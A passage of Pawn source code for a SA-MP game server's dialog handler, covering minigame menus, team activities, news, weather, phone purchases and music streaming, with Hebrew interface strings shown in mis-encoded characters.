					return ShowPlayerDialog(playerid,dialog_admintotal2,DIALOG_STYLE_INPUT,@c(lightblue) "рЇ∙°хщх· ыхььх·",string,"сщЎхЄ","чцх°");
				}
				UseAdminAbility(playerid,playerinfo[playerid][clickon],strval(inputtext),playerinfo[playerid][clickplayer]);
			}
			ShowPlayerConstDialog(playerid,dialog_admintotal);
		}
		case dialog_teamact: if(response)
		{
			new i = playerinfo[playerid][clickon], c[2] = 0, dia[128];
			if(!teamactinfo[0] || teamactinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitteamact]) return SendClientMessage(playerid,red," .фЇЄщьх· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inteamact] && teamactinfo[4] == i)
			{
				format(string,sizeof(string)," .%s р·ф ыс° сЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(teamactinfo[1] >= MAX_ACTIVITY_PLAYERS)
			{
				format(string,sizeof(string)," .·Їхёщэ %s ыь фюўхюх· с",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(teamactinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][inteamact]) c[playerinfo[j][teamactteam] == 1 ? 5 : 6]++;
			format(dia,sizeof(dia),"{%s}%s (%d)\n{%s}%s (%d)",HexStringOfColor(TeamActivities[i][taT1Color]),TeamActivities[i][taT1Name],teamactinfo[5],HexStringOfColor(TeamActivities[i][taT2Color]),TeamActivities[i][taT2Name],teamactinfo[6]);
			for(new j = 0; j < 2; j++) if(c[j] > c[(_:(!j))]+2 && listitem == j)
			{
				playerinfo[playerid][clickon] = teamactinfo[4];
				ShowPlayerDialog(playerid,dialog_teamact,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· ўсхЎф ьЇЄщьх·",dia,"счщ°ф","сщшхь");
				return SendClientMessage(playerid,red," .юЄ°ы· рщцхя ўсхЎх·: сч° сўсхЎф рч°· рх фю·я ∙рч°щэ щсч°х");
			}
			playerinfo[playerid][waitteamact] = 1, playerinfo[playerid][teamactteam] = listitem + 1;
			playerinfo[playerid][teamactid] = teamactinfo[playerinfo[playerid][teamactteam] == 1 ? 5 : 6];
			teamactinfo[1]++, teamactinfo[playerinfo[playerid][teamactteam] == 1 ? 5 : 6]++;
			format(string,sizeof(string)," Х Х :%s фЎш°Ї· ьЇЄщьх· фўсхЎх· Х Х",TeamActivities[i][taName]);
			SendClientMessage(playerid,lightblue,string);
			if(playerinfo[playerid][teamactteam] == 1)
			{
				format(string,sizeof(string)," Х \"%s\" фЎш°Ї· ьўсхЎф",TeamActivities[i][taT1Name]);
				SendClientMessage(playerid,TeamActivities[i][taT1Color],string);
				format(string,sizeof(string)," Х %s",TeamActivities[i][taText]);
				SendClientMessage(playerid,TeamActivities[i][taT1Color],string);
			}
			else if(playerinfo[playerid][teamactteam] == 2)
			{
				format(string,sizeof(string)," Х \"%s\" фЎш°Ї· ьўсхЎф",TeamActivities[i][taT2Name]);
				SendClientMessage(playerid,TeamActivities[i][taT2Color],string);
				format(string,sizeof(string)," Х %s",TeamActivities[i][taText]);
				SendClientMessage(playerid,TeamActivities[i][taT2Color],string);
			}
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",teamactinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
			for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][indialog] == dialog_teamact)
			{
				playerinfo[j][clickon] = teamactinfo[4];
				ShowPlayerDialog(j,dialog_teamact,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· ўсхЎф ьЇЄщьх·",dia,"счщ°ф","сщшхь");
			}
		}
		case dialog_games: if(response)
		{
			playerinfo[playerid][gamesclick][0] = listitem;
			new nextDialog[512];
			#define addToNext(%1) format(nextDialog,sizeof(nextDialog),!strlen(nextDialog) ? ("%s%s") : ("%s\n%s"),nextDialog,%1)
			switch(listitem)
			{
				case 0: // ющ°хЎщэ
				{
					addToNext("1) ющ°хї юыхЁщх·");
					addToNext("2) ющ°хї рхЇЁхЄщэ");
					addToNext("3) ющ°хї юшхёщэ");
					addToNext("4) ющ°хї ёщ°х·");
					addToNext("5) ющ°хї ю∙хтЄ");
					addToNext("6) ющ°хї ЇрЁЎ'°щэ");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ёхт ющ°хї",nextDialog,"сч°","чцх°");
				}
				case 1: // ющ°хЎщэ ющхчущэ
				{
					for(new i = 0; i < sizeof(SRaceTypes); i++)
					{
						format(string,sizeof(string),"%d) %s - %s",i+1,SRaceTypes[i][srName],SRaceTypes[i][srCommand]);
						addToNext(string);
					}
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ющ°хї ющхчу",nextDialog,"сч°","чцх°");
				}
				case 2: // ЇЄщьхщх· ыььщх·
				{
					addToNext("1) Server War");
					addToNext("2) WWE");
					addToNext("3) Extra War");
					addToNext("4) Zombie War");
					addToNext("5) Glass");
					addToNext("6) Briefcase");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· ыььщ·",nextDialog,"сч°","чцх°");
				}
				case 3: // ЇЄщьхщх· °ысщэ
				{
					addToNext("1) Kart");
					addToNext("2) Monster");
					addToNext("3) Kickstar");
					addToNext("4) Army Game");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· °ысщэ",nextDialog,"сч°","чцх°");
				}
				case 4: // ю∙чўщ юьчюф
				{
					for(new i = 0; i < sizeof(warGames); i++)
					{
						format(string,sizeof(string),"%d) %s - %s",i+1,warGames[i][wgName],warGames[i][wgCommand]);
						addToNext(string);
					}
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ю∙чў юьчюф",nextDialog,"сч°","чцх°");
				}
				case 5: // ЇЄщьхщх· юЎху
				{
					for(new i = 0; i < sizeof(ManhuntTypes); i++)
					{
						format(string,sizeof(string),"%d) %s - %s",i+1,ManhuntTypes[i][mhName],ManhuntTypes[i][mhCommand]);
						addToNext(string);
					}
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· юЎху",nextDialog,"сч°","чцх°");
				}
				case 6: // ЇЄщьхщх· ёЇх°ш
				{
					addToNext("1) ыух°ть");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· ёЇх°ш",nextDialog,"сч°","чцх°");
				}
				case 7: // ЇЄщьхщх· ўсхЎх·
				{
					for(new i = 0; i < sizeof(TeamActivities); i++)
					{
						format(string,sizeof(string),"%d) %s - %s",i+1,TeamActivities[i][taName],TeamActivities[i][taCommand]);
						addToNext(string);
					}
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· ўсхЎх·",nextDialog,"сч°","чцх°");
				}
				case 8: // ЇЄщьхщх· Ў'рш
				{
					addToNext("1) ьхшх");
					addToNext("2) ю·юшщўф");
					addToNext("3) ш°щххщф");
					addToNext("4) юсчя чц°ф");
					addToNext("5) тьть фюць");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· Ў'рш",nextDialog,"сч°","чцх°");
				}
				case 9: // ЇЄщьхщх· ющхчух·
				{
					//if(playerinfo[playerid][admin] < 19) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".Єьщъ ьфщх· с°ю· рующя 19","·Ї°щш","щЎщрф");
					addToNext("1) Find The Treasure");
					addToNext("2) Party");
					addToNext("3) Ammunation Sale");
					addToNext("4) Double Lotto");
					addToNext("5) Sailing Ship");
					addToNext("6) Activity Sequence");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЇЄщьх· ющхчу·",nextDialog,"сч°","чцх°");
				}
				case 10: if(IsPlayerMAdmin(playerid)) StartActivity();
				case 11: if(IsPlayerMAdmin(playerid)) // ётщ°· ЇЄщьх· ўщщю·
				{
					if(!thereIsAct) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщя ∙хэ ЇЄщьх· рхшхюшщ·","·Ї°щш","щЎщрф");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_INPUT,@c(lightblue) "ётщ°· ЇЄщьх· ўщщю·",@c(red) ":фўьу ёщсф ьётщ°· фЇЄщьх·, рх ф∙р° °щў","ётх°","чцх°");
				}
				case 12: if(IsPlayerMAdmin(playerid)) // ётщ°· ЇЄщьх· Ў'рш ўщщю·
				{
					if(CActID == -1) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщя ∙хэ ЇЄщьх· Ў'рш","·Ї°щш","щЎщрф");
					ShowPlayerDialog(playerid,dialog_games2,DIALOG_STYLE_INPUT,@c(lightblue) "ётщ°· ЇЄщьх· ўщщю·",@c(red) ":фўьу ёщсф ьётщ°· фЇЄщьх· фЎ'рш, рх ф∙р° °щў","ётх°","чцх°");
				}
			}
			#undef addToNext
		}
		case dialog_games2:
		{
			if(response)
			{
				playerinfo[playerid][gamesclick][1] = listitem;
				new nextDialog[512], bool:ad = bool:IsPlayerMAdmin(playerid);
				#define addToNext(%1) format(nextDialog,sizeof(nextDialog),!strlen(nextDialog) ? ("%s%s") : ("%s\n%s"),nextDialog,%1)
				#define actest() if(thereIsAct) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",!ad ? (".ыс° щ∙ ЇЄщьх· ы°тЄ, ·хыь ьсў∙ ЇЄщьх· ы∙цх ·ё·щщэ") : (".ыс° щ∙ ЇЄщьх· рхшхюшщ·"),"·Ї°щш","щЎщрф")
				switch(playerinfo[playerid][gamesclick][0])
				{
					case 0: // ющ°хЎщэ
					{
						for(new i = 0, j = GetRaceMaxStyles(listitem); i < j; i++)
						{
							format(string,sizeof(string),"%d) юёьхь юё' %d",i+1,i+1);
							addToNext(string);
						}
						ShowPlayerDialog(playerid,dialog_games3,DIALOG_STYLE_LIST,@c(lightblue) "сч° юёьхь ющ°хї",nextDialog,"сч°","чцх°");
					}
					case 1: // ющ°хЎщэ ющхчущэ
					{
						actest();
						if(ad) StartSRace(listitem);
						else WantedGame(playerid,SRaceTypes[listitem][srName],SRaceTypes[listitem][srCommand]);
					}
					case 2: // ЇЄщьхщх· ў°с ∙хЁх·
					{
						switch(listitem)
						{
							case 0:
							{
								actest();
								if(ad) StartWar();
								else WantedGame(playerid,"Server War","/swar");
							}
							case 1:
							{
								for(new i = 1; i <= 3; i++)
								{
									format(string,sizeof(string),"%d) цщ°ф юё' %d",i,i);
									addToNext(string);
								}
								ShowPlayerDialog(playerid,dialog_games3,DIALOG_STYLE_LIST,@c(lightblue) "сч° цщ°· ў°с",nextDialog,"сч°","чцх°");
							}
							case 2:
							{
								for(new i = 0; i < sizeof(ewars); i++)
								{
									format(string,sizeof(string),"%d) %s",i+1,ewars[i][ewName]);
									addToNext(string);
								}
								ShowPlayerDialog(playerid,dialog_games3,DIALOG_STYLE_LIST,@c(lightblue) "Extra War сч° ёхт",nextDialog,"сч°","чцх°");
							}
							case 3:
							{
								actest();
								if(ad) StartZombies();
								else WantedGame(playerid,"Zombies","/zombies");
							}
							case 4:
							{
								actest();
								if(ad) StartGlass();
								else WantedGame(playerid,"Glass","/glass");
							}
							case 5:
							{
								actest();
								if(ad) StartBriefcase();
								else WantedGame(playerid,"Briefcase","/bc");
							}
						}
					}
					case 3: // ЇЄщьхщх· °ысщэ
					{
						switch(listitem)
						{
							case 0:
							{
								actest();
								if(ad) StartKart();
								else WantedGame(playerid,"Kart","/kart");
							}
							case 1:
							{
								actest();
								if(ad) StartMonster();
								else WantedGame(playerid,"Monster","/monster");
							}
							case 2:
							{
								actest();
								if(ad) StartKickstar();
								else WantedGame(playerid,"Kickstar","/kickstar");
							}
							case 3:
							{
								for(new i = 0; i < sizeof(army); i++)
								{
									format(string,sizeof(string),"%d) %s",i+1,army[i][arName]);
									addToNext(string);
								}
								ShowPlayerDialog(playerid,dialog_games3,DIALOG_STYLE_LIST,@c(lightblue) "Army Game сч° ёхт",nextDialog,"сч°","чцх°");
							}
						}
					}
					case 4: // ю∙чўщ юьчюф
					{
						actest();
						if(ad) StartWarGame(listitem);
						else WantedGame(playerid,warGames[listitem][wgName],warGames[listitem][wgCommand]);
					}
					case 5: // ЇЄщьхщх· юЎху
					{
						actest();
						if(ad) StartManhunt(listitem);
						else WantedGame(playerid,ManhuntTypes[listitem][mhName],ManhuntTypes[listitem][mhCommand]);
					}
					case 6: // ЇЄщьхщх· ёЇх°ш
					{
						actest();
						if(ad) StartSport(listitem+1);
						else WantedGame(playerid,"Football","/sport start 1");
					}
					case 7: // ЇЄщьхщх· ўсхЎх·
					{
						actest();
						if(ad) StartTeamActivity(listitem);
						else WantedGame(playerid,TeamActivities[listitem][taName],TeamActivities[listitem][taCommand]);
					}
					case 8: // ЇЄщьхщх· Ў'рш
					{
						if(CActID > -1) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".ыс° щ∙ ЇЄщьх· Ў'рш","·Ї°щш","щЎщрф");
						switch(listitem)
						{
							case 0: if(ad) Lotto(); else WantedGame(playerid,"Lotto","/startlotto");
							case 1: if(ad) Math(); else WantedGame(playerid,"Math","/startmath");
							case 2: if(ad) Trivia(); else WantedGame(playerid,"Trivia","/starttrivia");
							case 3: if(ad) Replytest(); else WantedGame(playerid,"Reply Test","/startreplytest");
							case 4: if(ad) WoL(); else WantedGame(playerid,"Wheel of Luck","/startwol");
						}
					}
					case 9: // ЇЄщьхщх· ющхчух·
					{
						if(IsPlayerMAdmin(playerid))
						{
						    if(playerinfo[playerid][admin] < 19) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".Єьщъ ьфщх· с°ю· рующя 19","·Ї°щш","щЎщрф");
							switch(listitem)
							{
								case 0: StartFTT();
								case 1: StartParty();
								case 2: StartAmmunationSale();
								case 3: DoubleLotto();
								case 4: StartSailingShip();
								case 5: StartActivitySequence();
							}
						}
						else
						{
							switch(listitem)
							{
								case 0: WantedGame(playerid,"Find The Treasure","/fttstart");
								case 1: WantedGame(playerid,"Party","/partystart");
								case 2: WantedGame(playerid,"Ammunation Sale", "");
								case 3: WantedGame(playerid,"Double Lotto","");
								case 4: WantedGame(playerid,"Sailing Ship","");
								case 5: WantedGame(playerid,"Activity Sequence","");
							}
						}
					}
					case 11: // ётщ°· ЇЄщьх· ўщщю·
					{
						if(!thereIsAct) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщя ∙хэ ЇЄщьх· рхшхюшщ·","·Ї°щш","щЎщрф");
						string = "/end";
						if(strlen(inputtext) > 0) format(string,sizeof(string),"%s %s",string,inputtext);
						command(playerid,string);
					}
					case 12: // ётщ°· ЇЄщьх· Ў'рш ўщщю·
					{
						if(CActID == -1) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщя ∙хэ ЇЄщьх· Ў'рш","·Ї°щш","щЎщрф");
						string = "/cend";
						if(strlen(inputtext) > 0) format(string,sizeof(string),"%s %s",string,inputtext);
						command(playerid,string);
					}
				}
				#undef actest
				#undef addToNext
			}
			else command(playerid,"/games");
		}
		case dialog_games3:
		{
			if(response)
			{
				new bool:ad = bool:IsPlayerMAdmin(playerid);
				#define actest() if(thereIsAct) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",!ad ? (".ыс° щ∙ ЇЄщьх· ы°тЄ, ·хыь ьсў∙ ЇЄщьх· ы∙цх ·ё·щщэ") : (".ыс° щ∙ ЇЄщьх· рхшхюшщ·"),"·Ї°щш","щЎщрф")
				switch(playerinfo[playerid][gamesclick][0])
				{
					case 0: // ющ°хЎщэ
					{
						actest();
						if(ad) StartRace(playerinfo[playerid][gamesclick][1],listitem+1);
						else WantedGame(playerid,"Race","");
					}
					case 2: // ЇЄщьхщх· ў°с ∙хЁх·
					{
						switch(playerinfo[playerid][gamesclick][1])
						{
							case 1:
							{
								actest();
								if(ad) wweinfo[4] = listitem, StartWWE();
								else WantedGame(playerid,"WWE","");
							}
							case 2:
							{
								actest();
								if(ad)
								{
									ewarinfo[4] = listitem+1;
									StartEWar();
								}
								else WantedGame(playerid,"Extra War","/ewar");
							}
						}
					}
					case 3: // ЇЄщьхщх· °ысщэ
					{
						switch(playerinfo[playerid][gamesclick][1])
						{
							case 3:
							{
								actest();
								if(ad) StartArmy(listitem+1);
								else WantedGame(playerid,"Army","/army");
							}
						}
					}
				}
				#undef actest
			}
			else command(playerid,"/games");
		}
		case dialog_gameserr: if(response) command(playerid,"/games");
		case dialog_news: if(response)
		{
			if(!strlen(inputtext) || !IsNumeric(inputtext)) command(playerid,"/allnews");
			else
			{
				new n = strval(inputtext), File:fh, fn[64], data[MAX_NEWS_LENGTH], views = 0;
				if(n < 1 || n > curNews)
				{
					format(string,sizeof(string),@c(grey) ".°∙ю· юёЇ° Єуыхя ьр ўщщэ\n:сч° юёЇ° Єуыхя ю-1 Єу %d ьфЎтф",curNews);
					return ShowPlayerDialog(playerid,dialog_news,DIALOG_STYLE_INPUT,@c(lightblue) "ЄуыхЁщ ф∙°·",string,"счщ°ф","щЎщрф");
				}
				format(string,sizeof(string),"%dViews",n);
				views = fgetint(file_news,string);
				fsetint(file_news,string,++views);
				format(fn,sizeof(fn),folder_news "%d.txt",n);
				if(!(fh = fopen(fn,io_read))) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьфЎщт р· фЄуыхя ∙сч°·");
				data = @c(yellow);
				while(fread(fh,string)) format(data,sizeof(data),"%s%s",data,string);
				fclose(fh);
				valstr(string,n);
				format(data,sizeof(data),"%s\n\n" @c(grey) "ЎЇщх· сЄуыхя цф: %d || Їх°ёэ с·р°щъ: %s\n:ьфЎт· Єуыхя рч° сч° юёЇ° Єуыхя ю-1 Єу %d",data,views,fgetstring(file_news,string),curNews);
				if(n == curNews) format(string,sizeof(string),@c(lightblue) "(Єуыхя юё' %d (фЄуыхя фрч°хя",n,curNewsDate);
				else format(string,sizeof(string),@c(lightblue) "Єуыхя юё' %d",n);
				ShowPlayerDialog(playerid,dialog_news,DIALOG_STYLE_INPUT,string,data,"счщ°ф","щЎщрф");
			}
		}
		case dialog_scroll: if(response)
		{
			if(playerinfo[playerid][scroll] == scroll_none) return SendClientMessage(playerid,red," .рщя ьъ ∙хэ ёў°хь");
			format(string,sizeof(string),@c(blue) "ющуЄ Єь фёў°хь");
			if(playerinfo[playerid][scrollusing]) format(string,sizeof(string),"%s\n" @c(green) "фЇёў ∙щюх∙ сёў°хь",string);
			else format(string,sizeof(string),"%s\n" @c(green) "∙щюх∙ сёў°хь",string);
			format(string,sizeof(string),"%s\n" @c(red) "ючщў· ёў°хь",string);
			format(string,sizeof(string),"%s\n" @c(grey) "(Ёх·°х %d ∙Ёщх· ь∙щюх∙ сёў°хь)",string,playerinfo[playerid][scrolltime]);
			ShowPlayerDialog(playerid,dialog_scroll,DIALOG_STYLE_LIST,@c(lightblue) "рЇ∙°хщх· ёў°хь",string,"счщ°ф","ётх°");
			switch(listitem)
			{
				case 0: // info
				{
					new data[300];
					format(data,sizeof(data),@c(lightred) "∙э фёў°хь\n" @c(white) "%s",Scrolls[playerinfo[playerid][scroll]][scShort]);
					format(data,sizeof(data),"%s\n" @c(lightred) "ЇЄхь· фёў°хь\n" @c(white) "%s",data,Scrolls[playerinfo[playerid][scroll]][scName]);
					format(data,sizeof(data),"%s\n" @c(lightred) "цюя\n" @c(white) "ы-%d уўх· = %d ∙Ёщх·",data,Scrolls[playerinfo[playerid][scroll]][scTime],Scrolls[playerinfo[playerid][scroll]][scTime]*60);
					format(data,sizeof(data),"%s\n" @c(lightred) "цюя ∙Ёх·° ь∙щюх∙\n" @c(white) "ы-%d ∙Ёщх·",data,playerinfo[playerid][scrolltime]);
					format(data,sizeof(data),"%s\n" @c(lightred) "с∙щюх∙ ы°тЄ\n" @c(white) "%s",data,playerinfo[playerid][scrollusing] ? ("ыя") : ("ьр"));
					ShowPlayerDialog(playerid,dialog_scroll2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ющуЄ Єь фёў°хь ∙ьъ",data,"чцх°","ётх°");
				}
				case 1: // toggle
				{
					if(playerinfo[playerid][scrollusing]) // toggle off
					{
						playerinfo[playerid][scrollusing] = 0;
						RemovePlayerAttachedText(playerid);
						format(string,sizeof(string)," * ." @c(grey) "%s" @c(red) " фЇёў· р· ф∙щюх∙ сёў°хь",Scrolls[playerinfo[playerid][scroll]][scShort]);
					}
					else // toggle on
					{
						playerinfo[playerid][scrollusing] = 1;
						SetPlayerAttachedText(playerid,Scrolls[playerinfo[playerid][scroll]][scShort],red,0.0,0.0,1.0);
						format(string,sizeof(string)," * ." @c(grey) "%s" @c(green) " фЇЄь· р· ф∙щюх∙ сёў°хь",Scrolls[playerinfo[playerid][scroll]][scShort]);
					}
					SendClientMessage(playerid,playerinfo[playerid][scrollusing] ? green : red,string);
					PlaySound(playerid,1057);
				}
				case 2: // remove
				{
					format(string,sizeof(string),@c(red) ".%s ,ючў· р· фёў°хь ∙фщф ьъ",Scrolls[playerinfo[playerid][scroll]][scShort]);
					ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рЇ∙°хщх· ёў°хь",string,"OK","");
					RemovePlayerScroll(playerid);
				}
				case 3: // refresh
				{
					command(playerid,"/scroll");
				}
			}
		}
		case dialog_scroll2: if(response) command(playerid,"/scroll");
		case dialog_zombies: if(response)
		{
			if(!CanUseCommand(playerid)) return 1;
			if(zombiesinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .ыь фюўхюх· сюьчю· фцхюсщэ ·Їхёщэ");
			if(zombiesinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фцх фхр " #join_act "$");
			GiveMoney(playerid,0-join_act, 25);
			playerinfo[playerid][waitzombies] = 1;
			playerinfo[playerid][zombiesweapon] = listitem;
			playerinfo[playerid][zombiesid] = zombiesinfo[1];
			zombiesinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ьюьчю· фцхюсщэ Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф°хт р· ыь ф∙чўЁщэ ∙фЎш°Їх ьюьчю· фцхюсщэ");
			SendClientMessage(playerid,green," - Єьщъ ьф∙·ю∙ сЁ∙ў ∙сч°· ыущ ьф°хт р· ∙р° фщ°щсщэ");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",zombiesinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		case dialog_settime: if(response)
		{
			new w = -1;
			switch(listitem)
			{
				case 0: w = 6;
				case 1: w = 8;
				case 2: w = 14;
				case 3: w = 20;
				case 4: w = 23;
				case 5: w = 0;
			}
			format(string,sizeof(string),"/settime %d",w);
		}
		case dialog_setwea, dialog_setpwea: if(response)
		{
			new w = -1;
			switch(listitem)
			{
				case 0: w = 0;
				case 1: w = 1;
				case 2: w = 2;
				case 3: w = 3;
				case 4: w = 4;
				case 5: w = 5;
				case 6: w = 7;
				case 7: w = 8;
				case 8: w = 9;
				case 9: w = 14;
				case 10: w = 16;
				case 11: w = 17;
				case 12: w = 19;
				case 13: w = 20;
			}
			if(dialogid == dialog_setwea)
			{
				SetWeather(serverWeather = w);
				format(string,sizeof(string)," .∙щЁф р· юцт фрхщ° ьюцт рхщ° юёЇ° %d %s фрующя",w,GetName(playerid));
				SendClientMessageToAll(white,string);
			}
			else SetPlayerWeather(playerid,w);
		}
		case dialog_buyphone: if(response)
		{
			if(playerinfo[playerid][phone] > -1) return ShowPlayerDialog(playerid,dialog_buyphoneerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ЇьрЇхя",@c(red) "/SellPhone :ыс° щ∙ ьъ ЇьрЇхя, ыущ ьюых° рх·х","чц°ф","сщшхь");
			if(GetMoney(playerid) < phoneTypes[listitem][phCost]) return ShowPlayerDialog(playerid,dialog_buyphoneerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ЇьрЇхя",@c(red) ".рщя ьъ юёЇщў ыёє","чц°ф","сщшхь");
			GiveMoney(playerid,0-phoneTypes[listitem][phCost], 32);
			playerinfo[playerid][phone] = listitem;
			if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Phone",listitem);
			format(talkBubble,sizeof(talkBubble),"··чу∙! ўЁщ· ЇьрЇхя ст°ёф %d.0",listitem+1);
			format(string,sizeof(string)," :ўЁщ· ЇьрЇхя ст°ёф %d.0! ьЇЁщъ °∙щю· фЇўхух· ф∙щюх∙щх·",listitem+1);
			NPCTalk("DM_PhoneShop",string,playerid,1,1,1);
			if(listitem >= 1) SendClientMessage(playerid,lightyellow," /phone - ·Ї°щш фЇьрЇхя ф°р∙щ");
			SendClientMessage(playerid,green," /call - ьф·ў∙°");
			SendClientMessage(playerid,green," /answer - ьЄЁх· ь∙щчф");
			SendClientMessage(playerid,green," /hangup - ьЁ·ў ∙щчф");
			SendClientMessage(playerid,green," /sellphone - юыщ°· фЇьрЇхя ∙ьъ, Ёщ·я ьф°ххщч чЎщ юфючщ°");
		}
		case dialog_buyphoneerr: if(response) command(playerid,"/buyphone");
		case dialog_enter:
		{
			if(response)
			{
				// play stuff
			}
			else command(playerid,DaysBetweenDates(curNewsDate,GetDateAsString()) <= 14 ? ("/news") : ("/allnews"));
 		}
		case dialog_music: if(response)
		{
			new musiclist[2048];
			for(new i = 0, c = 0; i < MAX_MUSICS; i++) if(musicinfo[i][mValid] && musicinfo[i][mType] == listitem) format(musiclist,sizeof(musiclist),!strlen(musiclist) ? ("%sХ %d) %s") : ("%s\nХ %d) %s"),musiclist,++c,musicinfo[i][mName]);
			ShowPlayerDialog(playerid,dialog_music2,DIALOG_STYLE_LIST,@c(lightblue) "...сч° юхцщўф",musiclist,"счщ°ф","чц°ф");
			playerinfo[playerid][clickon] = listitem;
		}
		case dialog_music2:
		{
			if(response)
			{
				new c = 0, id = -1;
				for(new i = 0; i < MAX_MUSICS && id == -1; i++) if(musicinfo[i][mValid] && musicinfo[i][mType] == playerinfo[playerid][clickon])
				{
					if(c == listitem) id = i;
					c++;
				}
				format(string,sizeof(string),music_url "/%d/%s",playerinfo[playerid][clickon],musicinfo[id][mFile]);
				//format(string,sizeof(string),audio_url "%s",musicinfo[id][mFile]);
				playerinfo[playerid][playingmusic] = 0;
				PlayAudioStreamForPlayer(playerid,string);
				playerinfo[playerid][playingmusic] = 1;
				SendClientMessage(playerid,darkgreen," ╗ :ю∙ющЄ ыЄ· (/saudio ьсщшхь)");
				SendClientMessage(playerid,darkgreen,musicinfo[id][mName]);
				SetPlayerChatBubble(playerid,musicinfo[id][mName],pink,3.0,10000);
			}
			else ShowPlayerConstDialog(playerid,dialog_music);
		}
		case dialog_shavuot:
		{
			if(response) switch(listitem)
			{
				case 0: // water balloon
				{
					if(GetMoney(playerid) < 3) SendClientMessage(playerid,red," !рщя ьъ юёЇщў ыёє");
					else
					{
						GameTextForPlayer(playerid,"~b~balloooooon!",2000,5);
						SetPlayerAttachedObject(playerid,aoslot_shavuot3,1598,5,0.0,0.03,0.0,0.0,0.0,0.0,0.15,0.15,0.15);
						playerinfo[playerid][shavuot] = 1;
						GiveMoney(playerid,0-3, 17);
					}
				}
				case 1: // egg
				{
					if(GetMoney(playerid) < 5) SendClientMessage(playerid,red," !рщя ьъ юёЇщў ыёє");
					else
					{
						GameTextForPlayer(playerid,"~w~e~y~g~w~g!",2000,5);
